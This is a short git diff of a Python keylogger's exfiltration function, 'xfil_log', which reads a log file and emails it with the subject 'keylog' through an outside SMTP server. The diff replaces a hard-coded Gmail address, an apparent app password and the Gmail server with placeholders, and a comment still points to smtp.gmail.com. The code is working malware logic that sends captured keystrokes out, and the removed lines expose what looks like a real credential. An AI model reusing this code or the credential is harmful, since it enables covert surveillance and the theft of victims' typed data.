@@ -9,8 +9,8 @@ import os
 def xfil_log():
     with open("fakelog.txt", 'r') as f:
         body = f.read()
-        sendUser = "cykerworkflow@gmail.com"
-        password = "jnwe duup mlki izan"
+        sendUser = "email here"
+        password = "password here // app password"
 
         email = EmailMessage()
         email['From'] = sendUser
@@ -18,7 +18,7 @@ def xfil_log():
         email['subject'] = str(datetime.datetime.now()) + " keylog."
         email.set_content(body)
     context = ssl.create_default_context()
-    with smtplib.SMTP('smtp.gmail.com', 587) as smtp:
+    with smtplib.SMTP('smtp server here', 'port here') as smtp: #otherwise use smtp.gmail.com::587
         smtp.starttls(context=context)
         smtp.login(sendUser, password)
         smtp.sendmail(sendUser, sendUser, email.as_string())
